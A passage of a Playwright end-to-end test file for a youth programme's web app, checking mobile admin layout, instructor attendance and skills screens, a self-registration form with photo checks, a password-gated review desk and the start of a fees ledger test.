    await amP.evaluate(() => {
      const navItems = Array.from({ length: 30 }, (_, i) =>
        '<button class="admin-nav-item' + (i === 0 ? ' is-active' : '') + '">'
        + '<span class="admin-nav-icon">◯</span><span class="admin-nav-label">Section ' + (i + 1) + '</span></button>').join('');
      document.body.className = 'app-shell app-shell-admin';
      document.body.innerHTML = ''
        + '<div class="admin-topbar"><div class="admin-topbar-l"><div class="admin-topbar-title">'
        + '<div class="mono admin-topbar-eyebrow">NGG · CONTROL ROOM</div>'
        + '<div class="admin-topbar-section">Members</div></div></div>'
        + '<div class="admin-topbar-r"><span class="mono">A Person · owner</span>'
        + '<span class="admin-session-chip">4h left</span>'
        + '<button class="btn btn-on-dark-ghost btn-sm">Lock</button>'
        + '<button class="btn btn-on-dark-ghost btn-sm">View site</button></div></div>'
        + '<div class="admin-shell">'
        + '<div class="admin-nav-m"><label class="admin-nav-m-lab" for="amsel">Section</label>'
        + '<select id="amsel" class="admin-nav-m-sel"><optgroup label="People">'
        + '<option>Members</option><option>Mentors</option></optgroup></select></div>'
        + '<aside class="admin-nav"><div class="admin-nav-group">People</div>' + navItems + '</aside>'
        + '<main class="admin-main"><div class="admin-section">'
        + '<div class="admin-section-head"><h2 class="admin-h2">Members</h2>'
        + '<button class="btn btn-primary btn-sm">+ New member</button></div>'
        + '<div class="admin-tabs"><button class="admin-tab is-active">Awaiting parent · 42</button>'
        + '<button class="admin-tab">Verified · 318</button><button class="admin-tab">All · 360</button></div>'
        + '<div class="admin-table-wrap"><table class="admin-table">'
        + '<thead><tr><th>Student</th><th>Centre</th><th>Parent contact</th><th>Waiting</th><th>Status</th><th></th></tr></thead>'
        + '<tbody><tr><td><b>Testimony Mayowa Ajanni</b>'
        + '<div class="mono admin-cell-sub">SUM-2026-0142 · Practical Coding</div></td>'
        + '<td class="mono">Ijaiye</td><td class="mono">08084843532</td>'
        + '<td>9d<div class="mono admin-cell-sub">never reminded</div></td>'
        + '<td><span class="chip status-draft">awaiting parent</span></td>'
        + '<td><button class="btn btn-ghost btn-sm">Resend link</button></td></tr></tbody></table></div>'
        + '<label class="admin-field"><span>How was this obtained?</span>'
        + '<select class="admin-select"><option>Paper form</option></select></label>'
        + '<div class="admin-fields-row">'
        + '<label class="admin-field"><span>First name</span><input class="admin-input" value="Testimony"/></label>'
        + '<label class="admin-field"><span>Last name</span><input class="admin-input" value="Ajanni"/></label></div>'
        + '<div class="admin-grid-cards"><button class="admin-card">'
        + '<div class="admin-card-img admin-card-img-fallback">A</div>'
        + '<div class="admin-card-name">A Mentor</div>'
        + '<div class="mono admin-card-meta">Summer School · Egbeda</div></button></div>'
        + '</div></main></div>';
    });
    await amP.waitForTimeout(250);

    ok('the admin shell has controls to measure on a phone (control)',
       await amP.evaluate(() => document.querySelectorAll('.admin-main button, .admin-main input, .admin-main select').length) >= 6);
    /* The regression itself. Thirty stacked nav rows put the first section
       roughly 1500px down; anything under one viewport means the sidebar gave
       way to the picker instead of eating the screen. */
    const mainTop = await amP.evaluate(() => Math.round(document.querySelector('.admin-main').getBoundingClientRect().top));
    ok('…and the page starts on the first screen rather than below the nav (top ' + mainTop + 'px)',
       mainTop < 300);
    ok('…with the section picker offered in the sidebar\'s place',
       await amP.evaluate(() => {
         const sel = document.querySelector('.admin-nav-m-sel'), side = document.querySelector('.admin-nav');
         return !!sel && sel.getBoundingClientRect().height > 0 && getComputedStyle(side).display === 'none';
       }));
    ok('…and nothing pushes the console sideways off the screen',
       await amP.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1));

    const amTiny = await amP.evaluate(() => {
      const out = [];
      document.querySelectorAll('.admin-shell button, .admin-shell input, .admin-shell select').forEach(el => {
        /* Scroll it under the pointer first: the tabs and the table are
           deliberate scrollers, and elementFromPoint outside the viewport
           reports whatever is painted there instead of the target. */
        el.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' });
        const r = el.getBoundingClientRect();
        if (r.width < 1 || r.height < 1) return;
        if (r.right <= 0 || r.left >= window.innerWidth) return;
        if (r.bottom <= 0 || r.top >= window.innerHeight) return;
        const cx = Math.round(r.left + r.width / 2), cy = Math.round(r.top + r.height / 2);
        /* Deliberately NOT `h.contains(el)`: an ancestor containing the
           element is the ancestor being hit, not the button — counting it
           reports a 38px control as 49px because the row around it is tall.
           A ::after that widens the hit area still returns the element
           itself, so real extensions are credited and padding is not. */
        const owns = (x, y) => { const h = document.elementFromPoint(x, y); return !!h && (h === el || el.contains(h)); };
        let up = 0, down = 0;
        for (let d = 1; d <= 24; d++) { if (owns(cx, cy - d)) up = d; else break; }
        for (let d = 1; d <= 24; d++) { if (owns(cx, cy + d)) down = d; else break; }
        if (up + down + 1 < 40 || r.width < 40) out.push(String(el.className).split(' ')[0] + ' ' + Math.round(r.width) + 'x' + (up + down + 1));
      });
      return out;
    });
    ok('…every admin control is a 40px+ target (' + (amTiny.length ? amTiny.join(', ') : 'all pass') + ')',
       amTiny.length === 0);

    /* 10px mono at 0.18em tracking is a desk-distance detail. On a phone it was
       the ID number, the "reminded 2d ago" note and every field label. */
    const amSmall = await amP.evaluate(() => {
      const out = [];
      document.querySelectorAll('.admin-main *').forEach(el => {
        const t = (el.textContent || '').trim();
        if (!t || el.children.length > 0) return;
        const px = parseFloat(getComputedStyle(el).fontSize);
        if (px < 12) out.push(String(el.className).split(' ').slice(0, 2).join('.') + ' ' + px + 'px');
      });
      return Array.from(new Set(out));
    });
    ok('…and no admin copy is under 12px on a phone (' + (amSmall.length ? amSmall.join(', ') : 'all pass') + ')',
       amSmall.length === 0);

    /* Six columns will not fit in 390px, so the table scrolls — but scrolling
       out to a student's status is useless if their name leaves with it. */
    const stuck = await amP.evaluate(() => {
      const wrap = document.querySelector('.admin-table-wrap');
      const cell = wrap.querySelector('tbody td');
      wrap.scrollLeft = 0;
      const before = Math.round(cell.getBoundingClientRect().left - wrap.getBoundingClientRect().left);
      wrap.scrollLeft = 260;
      const scrolled = wrap.scrollLeft;
      const after = Math.round(cell.getBoundingClientRect().left - wrap.getBoundingClientRect().left);
      return { before, after, scrolled };
    });
    ok('the roster table actually scrolls sideways on a phone (' + stuck.scrolled + 'px)', stuck.scrolled > 100);
    ok('…and the name column stays pinned while it does (' + stuck.before + 'px → ' + stuck.after + 'px)',
       Math.abs(stuck.after - stuck.before) <= 1);
    await amP.close(); await amT.close();

    /* ── The teaching record, driven end to end ────────────────────────────
     * The whole point of the session log is that the register starts CORRECT
     * and the instructor touches only the exceptions — so what gets sent has
     * to be the corrections, not a second copy of the roll. That is invisible
     * in the markup and only shows up by driving the screen and reading the
     * request. */
    const tT = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true });
    const tP = await tT.newPage();
    const tErr = [];
    tP.on('pageerror', e => tErr.push(e.message));
    await tP.addInitScript(() => {
      const session = {
        course: 'Talking Drums', centre: 'Egbeda', date: '2026-07-28', role: 'instructor',
        courses: ['Talking Drums'], log: null,
        skills: ['Holds a steady pulse', 'Plays the core patterns cleanly'],
        levels: { 1: 'not yet', 2: 'getting there', 3: 'can do it', 4: 'can teach it' },
        students: [
          // Scanned and present: the instructor changes nothing about them.
          { studentId: 'S1', fullName: 'Ade Drummer', present: true, scanned: true, overridden: false },
          // Missed by the scanner: this is the one the log exists to correct.
          { studentId: 'S2', fullName: 'Bola Drummer', present: false, scanned: false, overridden: false },
        ],
      };
      window.__sent = [];
      const stub = {
        auth: { me: () => Promise.resolve({ member: { memberId: 'VOL-INS-1', fullName: 'Ife Instructor', portal: 'instructor', caps: [], role: 'volunteer' } }) },
        member: {
          mentorRoster: () => Promise.resolve({
            role: 'instructor', centre: 'Egbeda', centres: ['Egbeda'], needsCentre: false,
            courses: ['Talking Drums'], categories: [], presets: [],
            mentor: { name: 'Ife Instructor', centre: 'Egbeda', department: 'Talking Drums', programmes: ['summer'] },
            students: [{ studentId: 'S1', fullName: 'Ade Drummer', track: 'Talking Drums', starredToday: 0, v3: null }],
          }),
          session: () => Promise.resolve(JSON.parse(JSON.stringify(session))),
          sessionSave: (d) => { window.__sent.push(d); return Promise.resolve({ sessionLogId: 'CS-1', presentCount: 2, absentCount: 0 }); },
          skillsBoard: () => Promise.resolve({
            course: 'Talking Drums', centre: 'Egbeda', skills: session.skills, levels: session.levels,
            students: [{ studentId: 'S1', fullName: 'Ade Drummer', marks: { 'Holds a steady pulse': 3 }, marked: 1, of: 2 }],
          }),
          skillsMark: () => Promise.resolve({ saved: 1 }),
          remarks: () => Promise.resolve({ subjectId: 'S1', subjectName: 'Ade Drummer', remarks: [
            { remarkId: 'R1', kind: 'progress', body: 'Kept the pulse through the whole piece.', authorName: 'Ife Instructor', authorRole: 'instructor', course: 'Talking Drums', safeguarding: false, status: 'open', createdAt: '2026-07-27T10:00:00Z' },
            { remarkId: 'R2', kind: 'concern', body: 'Came in hungry again.', authorName: 'Ife Instructor', authorRole: 'instructor', course: 'Talking Drums', safeguarding: true, status: 'open', createdAt: '2026-07-28T10:00:00Z' },
          ] }),
          remarkAdd: () => Promise.resolve({ remarkId: 'R3', safeguarding: false }),
        },
      };
      /* Booting the real app means other screens call the client too. Anything
         this fixture does not model resolves empty rather than throwing, so the
         page-error assertion below stays about the teaching screens. */
      const soft = (obj) => new Proxy(obj, {
        get: (t, k) => (k in t) ? t[k] : (typeof k === 'string' ? () => Promise.resolve({}) : undefined),
      });
      stub.member = soft(stub.member);
      const root = new Proxy(stub, { get: (t, k) => (k in t) ? t[k] : soft({}) });
      /* The bundle assigns window.NGGApi as it loads, so a plain assignment
         here is overwritten before the portal ever calls it. */
      Object.defineProperty(window, 'NGGApi', { get: () => root, set: () => {}, configurable: false });
    });
    /* Boot the real bundle and navigate the way the app's own sign-in modal
       does. Serving index.html directly does not work here: its asset paths are
       absolute and this harness roots the server above /dist. */
    fs.writeFileSync(path.join(ROOT, 'tests', '_teach_fixture.html'),
      '<!doctype html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">'
      + '<link rel="stylesheet" href="/dist/styles.css"><link rel="stylesheet" href="/dist/styles-app.css"></head>'
      + '<body><div id="root"></div>'
      + '<script src="/dist/vendor/react.production.min.js"></script>'
      + '<script src="/dist/vendor/react-dom.production.min.js"></script>'
      + '<script src="/dist/data.js"></script><script src="/dist/photos.js"></script>'
      + '<script src="/dist/app.min.js"></script></body></html>');
    await tP.goto(BASE + '/tests/_teach_fixture.html', { waitUntil: 'networkidle' });
    await tP.waitForFunction(() => typeof window.__navigate === 'function', null, { timeout: 15000 });
    await tP.evaluate(() => window.__navigate('mentor'));
    await tP.waitForTimeout(1400);

    /* An instructor's home is the class, not the roster: they teach one course
       to the same twenty children and the first thing they need is today. */
    ok('an instructor lands on today\'s session, not the star roster',
       await tP.evaluate(() => {
         const t = document.querySelector('[role="tab"][aria-selected="true"]');
         return !!t && /Today's session/.test(t.textContent);
       }));
    ok('…with the register already answered by the gate scan',
       await tP.getByRole('button', { name: /Mark away: Ade Drummer/ }).count() === 1
       && await tP.getByRole('button', { name: /Mark here: Bola Drummer/ }).count() === 1);

    await tP.getByRole('button', { name: /Mark here: Bola Drummer/ }).click();
    await tP.getByRole('button', { name: /^File session$/ }).click();
    await tP.waitForTimeout(400);
    const filed = await tP.evaluate(() => window.__sent[0] || null);
    /* The claim the whole design rests on. Sending both children back would
       fork the register: the gate would say one thing and the log another,
       with no way to tell which was right an hour later. */
    ok('filing sends only the child the instructor corrected',
       !!filed && JSON.stringify(filed.markedPresent) === '["S2"]' && JSON.stringify(filed.markedAbsent) === '[]');

    await tP.getByRole('tab', { name: 'Skills' }).click();
    await tP.waitForTimeout(400);
    await tP.getByRole('button', { name: /Ade Drummer/ }).first().click();
    await tP.waitForTimeout(300);
    const lv = await tP.evaluate(() => Array.from(document.querySelectorAll('button')).map(b => b.textContent.trim()));
    /* Four named levels and no score. A number out of five invites a ranking
       between children; this is meant to say what one child can now do. */
    ok('the skills grid offers named levels, never a number',
       ['not yet', 'getting there', 'can do it', 'can teach it'].every(l => lv.indexOf(l) !== -1)
       && !lv.some(x => /^[1-5]$/.test(x)));

    await tP.getByRole('tab', { name: 'Stars & notes' }).click();
    await tP.waitForTimeout(400);
    await tP.getByRole('button', { name: /Notes on Ade Drummer/ }).first().click();
    await tP.waitForTimeout(400);
    const thread = await tP.evaluate(() => {
      const d = document.querySelector('[role="dialog"]');
      return d ? d.innerText : '';
    });
    ok('the notes thread shows what the instructor wrote', /Kept the pulse through the whole piece/.test(thread));
    /* A flag that only lives in a database column is a flag nobody acts on. */
    ok('…and a safeguarding flag is visible on the card, not just stored', /safeguarding/i.test(thread));
    ok('…while saying plainly who can read it', /Never shown to parents/i.test(thread));
    ok('the teaching screens threw nothing (' + (tErr[0] || 'clean') + ')', tErr.length === 0);
    await tP.close(); await tT.close();
    try { fs.unlinkSync(path.join(ROOT, 'tests', '_teach_fixture.html')); } catch (_) {}

    /* ── Self-registration, and the desk that checks it ────────────────────
     * A family filling this in on a phone, unsupervised, possibly on a slow
     * connection. Two claims worth holding: the photo is judged on the photo
     * step with the reason shown, and the review desk announces that it has
     * its own password rather than letting a coordinator try the check-in one
     * three times and give up. */
    const srT = await browser.newContext({ viewport: { width: 390, height: 900 }, hasTouch: true });
    const srP = await srT.newPage();
    const srErr = [];
    srP.on('pageerror', e => srErr.push(e.message));
    await srP.addInitScript(() => {
      const soft = (o) => new Proxy(o, { get: (t, k) => (k in t) ? t[k] : (typeof k === 'string' ? () => Promise.resolve({}) : undefined) });
      window.__sent = [];
      const stub = {
        auth: { me: () => Promise.reject(Object.assign(new Error('u'), { code: 'unauthorized' })) },
        /* What the photo step calls. It uploads when a cloud is configured and
           hands the image back inline when not — this fixture is the no-cloud
           case, which is every deployment until three keys are set. */
        uploadOrInline: (file) => new Promise((res, rej) => {
          const r = new FileReader();
          r.onload = () => res({ url: String(r.result || ''), inline: true });
          r.onerror = () => rej(new Error('unreadable_image'));
          r.readAsDataURL(file);
        }),
        public: {
          selfreg: {
            context: () => Promise.resolve({ open: true, selfServe: true, gate: { name: 'Public link' },
              form: { version: 2, fields: [
                { key: 'secChild', label: 'About the child', type: 'section' },
                { key: 'firstName', label: 'First name', type: 'text', required: true },
                { key: 'lastName', label: 'Last name', type: 'text', required: true },
                { key: 'age', label: 'Age', type: 'number', required: true, min: 5, max: 19 },
                { key: 'secCourse', label: 'What they want to learn', type: 'section' },
                { key: 'faculty', label: 'Faculty', type: 'choice', options: ['Music'], required: true },
                { key: 'course', label: 'Course', type: 'choice', optionsFrom: 'faculty', optionsBy: { Music: ['Piano'] }, required: true },
                /* Required, and hidden unless the faculty is Media. A rule
                   that demands an answer to a question the family was never
                   shown is a form that cannot be completed at all. */
                { key: 'showreel', label: 'Link to their work', type: 'text', required: true,
                  showIf: { key: 'faculty', op: 'is', value: 'Media' } },
                { key: 'secParent', label: 'Parent or guardian', type: 'section' },
                { key: 'parentPhone', label: "Parent's phone", type: 'phone' },
                { key: 'parentEmail', label: "Parent's email", type: 'email' },
              ] },
              consents: [{ key: 'participation', label: 'Program participation', required: true },
                         { key: 'media', label: 'Photos & media', required: false }] }),
            submit: (b) => { window.__sent.push(b); return Promise.resolve({ ref: 'RC1-0099', studentId: 'RC1-0099', regStatus: 'self_pending' }); },
          },
        },
      };
      stub.public = soft(stub.public);
      const root = new Proxy(stub, { get: (t, k) => (k in t) ? t[k] : soft({}) });
      Object.defineProperty(window, 'NGGApi', { get: () => root, set: () => {}, configurable: false });
    });
    fs.writeFileSync(path.join(ROOT, 'tests', '_apply_fixture.html'),
      '<!doctype html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">'
      + '<link rel="stylesheet" href="/dist/styles.css"><link rel="stylesheet" href="/dist/styles-app.css"></head>'
      + '<body><div id="root"></div>'
      + '<script src="/dist/vendor/react.production.min.js"></script>'
      + '<script src="/dist/vendor/react-dom.production.min.js"></script>'
      + '<script src="/dist/data.js"></script><script src="/dist/photos.js"></script>'
      + '<script src="/dist/app.min.js"></script></body></html>');
    await srP.goto(BASE + '/tests/_apply_fixture.html', { waitUntil: 'networkidle' });
    await srP.waitForFunction(() => typeof window.__navigate === 'function', null, { timeout: 15000 });
    await srP.evaluate(() => { history.pushState({}, '', '/apply?g=GL-TEST'); window.__navigate('apply'); });
    await srP.waitForTimeout(1100);
    const srText = await srP.evaluate(() => document.body.innerText);
    ok('the public link renders the live form, not a hardcoded one',
       /First name/.test(srText) && /Choose a faculty first/.test(srText));
    /* Four short steps rather than one long page: a twenty-field form on a
       phone is where people give up. */
    ok('…in steps, with the consent step named before you start', /Details/.test(srText) && /Consent/.test(srText));

    /* The questions come in labelled groups. Twelve boxes in one column is a
       wall on a phone, and they are not one subject — a family that does not
       notice the form has changed who it is asking about types the child's own
       number into the guardian field. */
    ok('…with the questions grouped under headings, not one long column',
       /ABOUT THE CHILD/i.test(srText) && /PARENT OR GUARDIAN/i.test(srText));
    /* And the heading has to LOOK like one. This was a 10px grey mono line
       with six pixels of air above it, which at arm's length on a phone is
       another row of grey text in a column of grey text — the words were
       there and the grouping was not. Checked as separation and contrast, not
       as a font size: a rule under it, and a colour that is not the colour
       every field label already uses. */
    ok('…that read as headings — a rule beneath and their own colour',
       await srP.evaluate(() => {
         const h = Array.from(document.querySelectorAll('div'))
           .find(d => d.textContent.trim() === 'Parent or guardian' && d.children.length === 0);
         if (!h) return false;
         const block = h.parentElement;
         const rule = Array.from(block.children).find(c => c !== h && Math.round(c.getBoundingClientRect().height) === 1);
         /* The ACCENT, not another shade of the same ink. Every text colour on
            this page is a blue-white — comparing against one particular label
            would pass for any of the others, which is how the old grey mono
            heading looked "different" while reading as body text. Gold is the
            one colour on the page whose red channel leads. */
         const rgb = getComputedStyle(h).color.match(/\d+/g) || [];
         const accent = rgb.length >= 3 && +rgb[0] > +rgb[2] + 40;
         return !!rule && accent;
       }));

    /* Leaving Details is where the answers are checked. It used to let you
       through on a name alone and let the SERVER object after the photo, the
       consents and the submit — so a blank Centre surfaced four screens later,
       with the family thrown back to the top of the form having already
       photographed their child. */
    await srP.fill('input[type="text"] >> nth=0', 'Ada');
    await srP.fill('input[type="text"] >> nth=1', 'Obi');
    await srP.getByRole('button', { name: /Continue → Photo/ }).click();
    await srP.waitForTimeout(400);
    const halfText = await srP.evaluate(() => document.body.innerText);
    ok('a half-filled form does not get past the first step',
       /answers need fixing/.test(halfText) && !/A photo for the ID card/.test(halfText));
    /* And it puts the cursor IN the first bad box. "Please check the
       highlighted answers", with the highlight below the fold, is not telling
       somebody anything. */
    ok('…with the cursor already in the first answer that needs fixing',
       await srP.evaluate(() => {
         const el = document.activeElement;
         const lab = el && el.closest('[data-fieldkey]');
         return !!lab && lab.getAttribute('data-fieldkey') === 'age';
       }));

    await srP.fill('input[type="number"] >> nth=0', '12');
    await srP.selectOption('select >> nth=0', 'Music');
    await srP.waitForTimeout(200);
    await srP.selectOption('select >> nth=1', 'Piano');
    await srP.getByRole('button', { name: /Continue → Photo/ }).click();
    await srP.waitForTimeout(400);
    /* Phone OR email, never neither — the rule the server applies, which
       nothing on the form ever stated because it belongs to the pair rather
       than to either box. */
    ok('…and it will not let a family through with no way to reach them',
       /phone number or an email/.test(await srP.evaluate(() => document.body.innerText)));
    await srP.fill('input[type="tel"], input[type="text"] >> nth=2', '08031112222');
    await srP.getByRole('button', { name: /Continue → Photo/ }).click();
    await srP.waitForTimeout(400);
    /* The form has a required field that only appears for Media. Getting here
       at all means the rule did not demand an answer to a question this family
       was never shown — which would make the form impossible to finish, with
       nothing on screen to fix. */
    ok('…and through to the photo once the answers are good',
       /A photo for the ID card/.test(await srP.evaluate(() => document.body.innerText)));
    // A 90px image, offered the way a family would offer one.
    await srP.evaluate(() => {
      const cv = document.createElement('canvas'); cv.width = 90; cv.height = 90;
      cv.getContext('2d').fillRect(0, 0, 90, 90);
      const bin = atob(cv.toDataURL('image/png').split(',')[1]);
      const arr = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
      const dt = new DataTransfer(); dt.items.add(new File([arr], 'tiny.png', { type: 'image/png' }));
      const inp = document.querySelector('input[type=file]');
      inp.files = dt.files; inp.dispatchEvent(new Event('change', { bubbles: true }));
    });
    /* Longer than it was: the photo now goes through uploadOrInline, which asks
       the server whether a cloud is configured and lazily loads the resampler
       before it can judge anything. Waiting for the verdict text rather than a
       fixed delay, so this does not become a flaky timing test. */
    await srP.waitForFunction(() => !/Getting the photo ready/.test(document.body.innerText), null, { timeout: 15000 }).catch(() => {});
    await srP.waitForTimeout(400);
    const photoText = await srP.evaluate(() => document.body.innerText);
    /* Judged here, while the camera is still open. Being told at the end that
       something ten minutes ago was wrong is the worst moment to hear it. */
    ok('an unusable photo is refused on the photo step, with the reason',
       /at least 320 pixels/.test(photoText));
    ok('…and cannot be carried forward', await srP.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /Continue → Consent/.test(x.textContent));
      return !!b && b.disabled;
    }));
    ok('the public form threw nothing (' + (srErr[0] || 'clean') + ')', srErr.length === 0);
    await srP.close(); await srT.close();

    /* The review desk. Locked, and saying which password it wants. */
    const rvT = await browser.newContext({ viewport: { width: 1100, height: 1000 } });
    const rvP = await rvT.newPage();
    await rvP.addInitScript(() => {
      let locked = true;
      const soft = (o) => new Proxy(o, { get: (t, k) => (k in t) ? t[k] : (typeof k === 'string' ? () => Promise.resolve({}) : undefined) });
      const q = { ok: true, total: 2, page: 1, per: 25, shown: 2, gate: { name: 'Review desk' },
        counts: { self_pending: 2 }, centres: ['Egbeda'], courses: ['Piano'],
        queue: [
          { studentId: 'RC1-0101', displayId: 'EG-26-014', fullName: 'Ada Obi', firstName: 'Ada', lastName: 'Obi',
            age: 13, centre: 'Egbeda', course: 'Piano', guardianName: 'Mrs Obi',
            guardianPhone: '+2348031112222', parentEmail: 'obi@example.com', photoUrl: '', regStatus: 'self_pending',
            answers: [{ key: 'firstName', label: 'First name', type: 'text', value: 'Ada' },
                      { key: 'parentPhone', label: "Parent's phone", type: 'phone', value: '0803 111 2222' }],
            photo: { verdict: 'check', score: 52, issues: ['too_dark'], notes: [], source: 'ai', width: 720, height: 960 },
            // Four days old, and colliding with two other records under the
            // same name — one at her own centre, one elsewhere.
            submittedAt: new Date(Date.now() - 4 * 864e5).toISOString(),
            possibleDuplicate: true,
            duplicates: [
              { studentId: 'RC1-0044', displayId: 'EG-26-002', centre: 'Egbeda', course: 'Piano',
                regStatus: 'parent_pending', submittedAt: '2026-07-20T09:00:00Z' },
              { studentId: 'RC1-0077', displayId: 'AY-26-011', centre: 'Ayobo', course: 'Guitar',
                regStatus: 'verified', submittedAt: '2026-07-22T09:00:00Z' },
            ] },
          { studentId: 'RC1-0102', displayId: 'EG-26-015', fullName: 'Bola Eze', firstName: 'Bola', lastName: 'Eze',
            age: 12, centre: 'Egbeda', course: 'Piano', guardianName: 'Mr Eze',
            guardianPhone: '', parentEmail: 'eze@example.com', photoUrl: '', regStatus: 'self_pending',
            answers: [{ key: 'firstName', label: 'First name', type: 'text', value: 'Bola' }],
            photo: { verdict: 'pass', score: 88, issues: [], notes: [], source: 'ai', width: 900, height: 1200 },
            submittedAt: new Date(Date.now() - 90 * 60000).toISOString(),
            possibleDuplicate: false, duplicates: [] },
        ] };
      const stub = {
        auth: { me: () => Promise.reject(Object.assign(new Error('u'), { code: 'unauthorized' })) },
        public: {
          review: {
            queue: () => locked ? Promise.reject(Object.assign(new Error('f'), { code: 'forbidden' })) : Promise.resolve(q),
            approve: () => Promise.resolve({ ok: true }),
            approveBulk: (g, ids) => Promise.resolve({ approved: ids.length }),
            reject: (g, id, note) => note ? Promise.resolve({ ok: true }) : Promise.reject(Object.assign(new Error('r'), { code: 'reason_required' })),
          },
          gate: { unlock: (g, pw) => pw === 'right' ? (locked = false, Promise.resolve({ ok: true })) : Promise.reject(Object.assign(new Error('b'), { code: 'bad_password' })) },
        },
      };
      stub.public = soft(stub.public);
      const root = new Proxy(stub, { get: (t, k) => (k in t) ? t[k] : soft({}) });
      Object.defineProperty(window, 'NGGApi', { get: () => root, set: () => {}, configurable: false });
    });
    await rvP.goto(BASE + '/tests/_apply_fixture.html', { waitUntil: 'networkidle' });
    await rvP.waitForFunction(() => typeof window.__navigate === 'function', null, { timeout: 15000 });
    await rvP.evaluate(() => { history.pushState({}, '', '/review?g=GL-REV'); window.__navigate('review'); });
    await rvP.waitForTimeout(1100);
    /* A coordinator who tries the check-in password three times and gives up
       is the failure the separation invites; say it before they try. */
    ok('the review desk says it has its own password',
       /own password — not the one used for check-in/i.test(await rvP.evaluate(() => document.body.innerText)));
    /* Everything past the unlock is driven through `step` and reached by early
       return, because it all DEPENDS on the unlock having worked. A desk that
       fails to open used to throw out of this whole IIFE and take every later
       block in the file with it — see the note on `step`. Now it reports which
       control it could not drive and the suite carries on. */
    await (async () => {
      if (!await step('the review desk offers a password field to type into',
                      () => rvP.fill('input[aria-label="Review desk password"]', 'right'))) return;
      if (!await step('…and an Unlock button that can be pressed',
                      () => rvP.getByRole('button', { name: /Unlock/ }).click())) return;
      await rvP.waitForTimeout(900);
      const rvText = await rvP.evaluate(() => document.body.innerText);
      ok('…and unlocks to the queue', /2 waiting/.test(rvText) && /Ada Obi/.test(rvText));
      /* The queue is an INDEX. Its job is to get somebody to the right
         submission, not to be where decisions are made — a table asks you to
         approve from a summary line, which means approving without looking. */
      ok('…unlocking to a queue that lists rather than decides',
         /Select all 2 shown/.test(rvText) && /does not show you the photo/.test(rvText)
         && !/WHAT THEY SUBMITTED/.test(rvText));
      /* What approving DOES, in the words of the consequence. It used to email
         the guardian a consent form; a self-serve guardian now consents on the
         form itself, so approving confirms the place and issues the ID — and a
         desk that still says "emails the guardian" is describing a step that no
         longer happens, which is how somebody comes to approve without looking. */
      ok('…and saying plainly what approving actually does',
         /Consent is already on file/.test(rvText)
         && /confirms the place and issues the Genius ID/.test(rvText));
      /* How long they have waited, in words, not a date to do arithmetic on.
         This is the number that ought to be embarrassing when it grows, and a
         timestamp quietly never is. */
      ok('…telling you how long each family has been waiting',
         /4 days waiting/.test(rvText) && /1 hour waiting|hours waiting/.test(rvText));

      /* Each submission is its OWN page: its own address, its own back button,
         one job on the screen. */
      if (!await step('a queued submission can be opened from the index',
                      () => rvP.getByRole('button', { name: /Open/ }).first().click())) return;
      await rvP.waitForTimeout(500);
      ok('opening a submission gives it its own address',
         /[?&]s=RC1-0101/.test(await rvP.evaluate(() => window.location.search)));
      const oneText = await rvP.evaluate(() => document.body.innerText);
      ok('…with every answer the family gave, against the question asked',
         /WHAT THEY SUBMITTED/.test(oneText) && /Parent's phone/.test(oneText) && /0803 111 2222/.test(oneText));
      /* The verdict is next to the photo, not instead of it — and it is advice,
         never the decision. */
      ok('…the photo verdict reading as advice, with the duplicate warning',
         /Worth a look/.test(oneText) && /advice, not the decision/.test(oneText) && /possible duplicate/.test(oneText));
      /* A duplicate warning that does not say WHICH records is a dead end
         dressed as a warning — the reviewer still has to go and search the name
         by hand to tell the same child twice from two children sharing a common
         one, and those need opposite decisions. */
      ok('…and the duplicate names the records it collides with',
         /EG-26-002/.test(oneText) && /AY-26-011/.test(oneText));
      ok('…in a coordinator\'s words, not the database\'s',
         /waiting on consent/.test(oneText) && !/parent_pending/.test(oneText));
      ok('…with enough detail to tell one child from two',
         /Egbeda/.test(oneText) && /Ayobo/.test(oneText) && /Same centre and same course/.test(oneText));
      /* A reviewer is checking a registration, not proofing a print run. The
         card is not theirs to approve and it crowded out the thing that is.
         Checked structurally, not by wording: a preview reintroduced under any
         other caption still renders a .idcard, and that is the thing that must
         not be here. */
      ok('…and no ID-card preview anywhere on it',
        (await rvP.locator('.idcard').count()) === 0 && !/card that gets printed/i.test(oneText));
      /* Back belongs to the browser now, because the page is a real page. */
      if (!await step('…and the browser Back button works on it', () => rvP.goBack())) return;
      await rvP.waitForTimeout(500);
      ok('…and Back returns to the queue',
         !/[?&]s=/.test(await rvP.evaluate(() => window.location.search))
         && /Select all 2 shown/.test(await rvP.evaluate(() => document.body.innerText)));
    })();
    await rvP.close(); await rvT.close();
    try { fs.unlinkSync(path.join(ROOT, 'tests', '_apply_fixture.html')); } catch (_) {}

    /* ── Dues & fees ───────────────────────────────────────────────────────
     * Three admin-defined amounts and a ledger. Two things checked here that
     * matter more than the table rendering.
     *
     * THE MICROCOPY, and specifically that it is PLAYED LOW. It has to be
     * present — a family should not be surprised by a ₦75,000 line — and it has
     * to be quiet: no heading, no bold, smaller than the label it sits under. It
     * also has to state the CONDITION rather than promise the outcome, because a
     * member who leaves before the MOU is complete still owes the balance, and
     * copy that shouted "fully refunded" would have promised them otherwise.
     *
     * And that arrears rank by what is PAYABLE. Bode's charge is untouched
     * because he is still in training; Ada is further into service so more of
     * hers is earned off. Rank by what is charged and the wrong person is at the
     * top of the call list.
     */
    const fz = await browser.newPage();
    const fzErrs = [];
    fz.on('pageerror', e => fzErrs.push(String(e.message)));
    await fz.goto(BASE + '/tests/_boards_fixture.html?board=fees&mode=ok&css=1', { waitUntil: 'networkidle' });
    await fz.waitForTimeout(700);
    ok('the fees screen mounts with no script error', fzErrs.length === 0);
    if (fzErrs.length) console.error('       ', fzErrs.slice(0, 3).join(' | '));

    const fzArr = await fz.evaluate(() => Array.from(document.querySelectorAll('.admin-table tbody tr'))
      .map(r => r.innerText.replace(/\s+/g, ' ')));
    ok('arrears list both members with what is payable, not what is charged',
      fzArr.length === 2 && /Ada Obi/.test(fzArr[0]) && /₦62,000/.test(fzArr[0]) && /Bode Eze/.test(fzArr[1]));
    /* The training fee already earned off is shown as a deduction on the row, so
       a coordinator can see WHY the payable figure is below the charge. */
    ok('…showing how much training fee has been earned off',
